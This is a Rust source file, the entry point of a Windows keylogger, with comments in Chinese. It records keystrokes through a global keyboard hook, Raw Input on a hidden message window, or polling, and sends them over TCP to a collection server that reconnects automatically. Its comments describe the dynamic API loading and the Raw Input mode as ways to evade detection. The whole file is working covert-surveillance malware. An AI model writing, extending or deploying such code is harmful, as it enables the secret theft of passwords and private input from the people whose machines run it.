// 声明模块 - 这些模块在任何情况下都会被编译
mod key_handler; // 按键处理模块：将虚拟键码转换为可读字符串
mod network; // 网络模块：处理与服务器的 TCP 连接和数据传输
mod types; // 类型定义模块：Windows API 相关的类型和常量

// 条件编译模块 - 根据 feature 决定是否编译
// #[cfg(feature = "xxx")] 表示只有当启用对应 feature 时才编译该模块
#[cfg(feature = "hook")]
mod hook; // Hook 方式实现：使用 SetWindowsHookExA 设置全局键盘钩子
#[cfg(feature = "hook")]
mod windows_api; // Windows API 声明：动态加载和调用 Windows API 函数

#[cfg(feature = "raw-input")]
mod raw_input; // Raw Input 方式实现：使用原始输入 API 接收键盘事件

#[cfg(feature = "polling")]
mod polling; // Polling 方式实现：使用轮询检测按键状态

// 导入 Hook 方式需要的符号
#[cfg(feature = "hook")]
use hook::{low_level_keyboard_proc, set_network_transmitter}; // 钩子回调函数和设置函数
#[cfg(feature = "hook")]
use types::*; // 导入所有类型定义
#[cfg(feature = "hook")]
use windows_api::*; // 导入 Windows API 函数指针

// 导入 Raw Input 方式需要的符号
#[cfg(feature = "raw-input")]
use raw_input::{
    HWND_MESSAGE,            // 消息窗口句柄常量
    RAWINPUTDEVICE,          // 原始输入设备结构体
    RIDEV_INPUTSINK,         // 输入接收标志
    RegisterRawInputDevices, // 注册原始输入设备函数
    WM_INPUT,                // 原始输入消息常量
    handle_raw_input,        // 处理原始输入的函数
    set_network_transmitter, // 设置网络传输器
};

// 导入 Polling 方式需要的符号
// 注意：只有当同时没有启用 hook 和 raw-input 时才导入
#[cfg(all(feature = "polling", not(feature = "hook"), not(feature = "raw-input")))]
use polling::{poll_keys, set_network_transmitter};

// 导入网络模块的符号 - 这些在所有模式下都需要
use network::{NetworkConfig, NetworkTransmitter};
use std::mem; // 内存操作，如 zeroed()
use std::ptr; // 指针操作
use std::sync::Arc; // 原子引用计数，用于多线程共享数据
use std::time::Duration; // 时间间隔

/// 主函数 - 程序入口点
///
/// 程序执行流程：
/// 1. 初始化（根据 feature 加载不同的 API）
/// 2. 创建网络连接
/// 3. 启动键盘监听（根据 feature 使用不同方式）
/// 4. 进入消息循环，持续监听键盘事件
fn main() {
    // ========================================================================
    // Hook 方式的初始化
    // ========================================================================
    // Hook 方式需要动态加载 user32.dll 并获取函数指针
    // 这样做是为了避免静态链接可能带来的问题，同时也是一种反检测技术
    #[cfg(feature = "hook")]
    {
        unsafe {
            // 加载 user32.dll 库
            // user32.dll 包含了窗口管理和输入处理相关的 Windows API
            let user32_module = LoadLibraryA("user32.dll\0".as_ptr() as *const i8);

            // 检查是否加载成功
            // 如果返回 0（NULL），表示加载失败
            if user32_module == 0 {
                eprintln!("错误：无法加载 user32.dll");
                return;
            }

            // 初始化所有需要的函数指针
            // 这些函数指针存储在全局静态变量中，供后续调用
            init_function_pointers(user32_module);

            // 验证关键函数是否获取成功
            let hook_fn = *ptr::addr_of!(g_SetWindowsHookExA);
            if hook_fn.is_none() {
                eprintln!("错误：无法获取 SetWindowsHookExA 函数指针");
                return;
            }
        }
    }

    // ========================================================================
    // 网络配置和初始化
    // ========================================================================
    // 这部分对所有方式都是通用的

    // 创建网络配置
    // NetworkConfig 是一个结构体，包含服务器地址、端口和重连间隔
    let network_config = NetworkConfig {
        server_ip: "127.0.0.1".to_string(),         // 服务器 IP 地址
        server_port: 8888,                          // 服务器端口
        reconnect_interval: Duration::from_secs(5), // 重连间隔：5 秒
    };

    // 创建网络传输器实例
    // Arc 是原子引用计数智能指针，允许多线程共享所有权
    // 这里使用 Arc 是因为主线程和重连线程都需要访问网络传输器
    let network_transmitter = Arc::new(NetworkTransmitter::new(network_config.clone()));

    // 尝试连接到服务器
    match network_transmitter.connect() {
        Ok(_) => {
            eprintln!(
                "网络连接成功，按键数据将发送到 {}:{}",
                network_config.server_ip, network_config.server_port
            );
        }
        Err(e) => {
            // 连接失败不退出程序，按键数据会先在本地显示
            // 后台重连线程会定期尝试重新连接
            eprintln!("网络连接失败：{}", e);
            eprintln!("按键数据将只在本地显示");
        }
    }

    // 启动后台重连线程
    // 该线程会定期检查连接状态，如果断开则尝试重连
    network_transmitter.start_reconnect_thread();

    // ========================================================================
    // 启动键盘监听
    // ========================================================================
    unsafe {
        // 设置全局网络传输器引用
        // 这样在键盘事件回调中就可以访问网络传输器
        set_network_transmitter(Arc::clone(&network_transmitter));

        // ------------------------------------------------------------------------
        // Hook 方式：使用 SetWindowsHookExA 设置全局低级键盘钩子
        // ------------------------------------------------------------------------
        #[cfg(feature = "hook")]
        {
            // 获取当前模块的实例句柄
            let h_instance = GetModuleHandleA(ptr::null());

            // 设置低级键盘钩子
            // 参数说明：
            //   WH_KEYBOARD_LL: 钩子类型，表示低级键盘钩子
            //   low_level_keyboard_proc: 回调函数，当有键盘事件时会被调用
            //   h_instance: 当前模块实例
            //   0: 线程 ID，0 表示全局钩子（所有线程的键盘事件都会被捕获）
            let hook = if let Some(set_windows_hook_ex_a) = g_SetWindowsHookExA {
                set_windows_hook_ex_a(WH_KEYBOARD_LL, low_level_keyboard_proc, h_instance, 0)
            } else {
                eprintln!("错误：无法设置键盘钩子");
                return;
            };

            // 检查钩子是否设置成功
            if hook == 0 {
                eprintln!("错误：无法设置键盘钩子");
                return;
            }

            eprintln!("键盘钩子已成功设置，开始记录按键...\n");

            // 创建消息结构体，用于接收 Windows 消息
            let mut msg: MSG = mem::zeroed();

            // 消息循环
            // Windows 钩子需要一个消息循环来保持运行
            // GetMessageA 会阻塞等待消息到达
            loop {
                if let Some(get_message_a) = g_GetMessageA {
                    // 获取下一条消息
                    // 返回值：
                    //   -1: 错误
                    //   0: 收到 WM_QUIT 消息，应该退出
                    //   其他: 正常获取到消息
                    let result = get_message_a(&mut msg, 0, 0, 0);

                    if result == 0 {
                        eprintln!("收到退出消息，停止记录按键");
                        break;
                    } else if result == -1 {
                        eprintln!("错误：GetMessage 失败");
                        break;
                    }
                } else {
                    eprintln!("错误：无法获取 GetMessageA 函数");
                    break;
                }
            }

            // 程序退出前卸载钩子
            if let Some(unhook_windows_hook_ex) = g_UnhookWindowsHookEx {
                if unhook_windows_hook_ex(hook) != 0 {
                    eprintln!("键盘钩子已成功卸载");
                } else {
                    eprintln!("警告：无法卸载键盘钩子");
                }
            }
        }

        // ------------------------------------------------------------------------
        // Raw Input 方式：使用原始输入 API
        // ------------------------------------------------------------------------
        // Raw Input 是 Windows 提供的一种获取原始输入设备数据的方式
        // 相比 Hook 方式，它不会被检测为钩子，更隐蔽
        #[cfg(feature = "raw-input")]
        {
            use std::ffi::CString;

            // 创建窗口类名和窗口名
            let class_name = CString::new("MessageWindow").unwrap();
            let window_name = CString::new("").unwrap();

            // 定义窗口类
            // 窗口类定义了窗口的行为和外观
            let wnd_class = winapi::um::winuser::WNDCLASSA {
                style: 0,                              // 窗口类样式
                lpfnWndProc: Some(raw_input_wnd_proc), // 窗口过程函数
                cbClsExtra: 0,                         // 类额外内存
                cbWndExtra: 0,                         // 窗口额外内存
                hInstance: ptr::null_mut(),            // 实例句柄
                hIcon: ptr::null_mut(),                // 图标句柄
                hCursor: ptr::null_mut(),              // 光标句柄
                hbrBackground: ptr::null_mut(),        // 背景画刷
                lpszMenuName: ptr::null(),             // 菜单名
                lpszClassName: class_name.as_ptr(),    // 类名
            };

            // 注册窗口类
            if winapi::um::winuser::RegisterClassA(&wnd_class) == 0 {
                eprintln!("错误：无法注册窗口类");
                return;
            }

            // 创建消息窗口
            // HWND_MESSAGE 表示这是一个仅用于接收消息的窗口，不会显示
            let hwnd = winapi::um::winuser::CreateWindowExA(
                0,                    // 扩展样式
                class_name.as_ptr(),  // 窗口类名
                window_name.as_ptr(), // 窗口名
                0,                    // 窗口样式
                0,
                0,
                0,
                0,                 // 位置和大小（对消息窗口无意义）
                HWND_MESSAGE as _, // 父窗口句柄（HWND_MESSAGE 表示消息窗口）
                ptr::null_mut(),   // 菜单句柄
                ptr::null_mut(),   // 实例句柄
                ptr::null_mut(),   // 创建参数
            );

            // 检查窗口是否创建成功
            if hwnd.is_null() {
                eprintln!("错误：无法创建消息窗口");
                return;
            }

            // 定义原始输入设备
            // RAWINPUTDEVICE 结构体指定要监听的设备类型
            let rid = RAWINPUTDEVICE {
                usUsagePage: 0x01,        // 用途页：通用桌面设备
                usUsage: 0x06,            // 用途：键盘
                dwFlags: RIDEV_INPUTSINK, // 标志：即使窗口不在前台也接收输入
                hwndTarget: hwnd as _,    // 目标窗口句柄
            };

            // 注册原始输入设备
            if RegisterRawInputDevices(&rid, 1, std::mem::size_of::<RAWINPUTDEVICE>() as u32) == 0 {
                eprintln!("错误：无法注册原始输入设备");
                return;
            }

            eprintln!("Raw Input 已成功设置，开始记录按键...\n");

            // 消息循环
            let mut msg: winapi::um::winuser::MSG = mem::zeroed();

            loop {
                // 获取消息
                let result = winapi::um::winuser::GetMessageA(&mut msg, ptr::null_mut(), 0, 0);

                if result == 0 {
                    eprintln!("收到退出消息，停止记录按键");
                    break;
                } else if result == -1 {
                    eprintln!("错误：GetMessage 失败");
                    break;
                }

                // 翻译消息（将虚拟键消息转换为字符消息）
                winapi::um::winuser::TranslateMessage(&msg);
                // 分发消息到窗口过程
                winapi::um::winuser::DispatchMessageA(&msg);
            }
        }

        // ------------------------------------------------------------------------
        // Polling 方式：使用轮询检测按键状态
        // ------------------------------------------------------------------------
        // Polling 方式最简单，不需要消息循环
        // 它定期检查每个按键的状态，检测到按下就记录
        #[cfg(feature = "polling")]
        {
            eprintln!("轮询模式已启动，开始记录按键...\n");
            // 进入轮询循环
            poll_keys();
        }
    }
}

/// Raw Input 方式的窗口过程函数
///
/// 窗口过程是 Windows 消息处理的核心概念
/// 每当窗口收到消息，Windows 就会调用这个函数
///
/// 参数：
///   hwnd: 窗口句柄
///   msg: 消息类型
///   wparam: 消息参数1
///   lparam: 消息参数2
///
/// 返回值：
///   消息处理结果
#[cfg(feature = "raw-input")]
extern "system" fn raw_input_wnd_proc(
    hwnd: winapi::shared::windef::HWND,
    msg: u32,
    wparam: winapi::shared::minwindef::WPARAM,
    lparam: winapi::shared::minwindef::LPARAM,
) -> winapi::shared::minwindef::LRESULT {
    unsafe {
        // 检查是否是原始输入消息
        if msg == WM_INPUT {
            // 处理原始输入数据
            handle_raw_input(lparam as _);
        }
        // 调用默认窗口过程处理其他消息
        // DefWindowProcA 会处理我们没有处理的消息
        winapi::um::winuser::DefWindowProcA(hwnd, msg, wparam, lparam)
    }
}
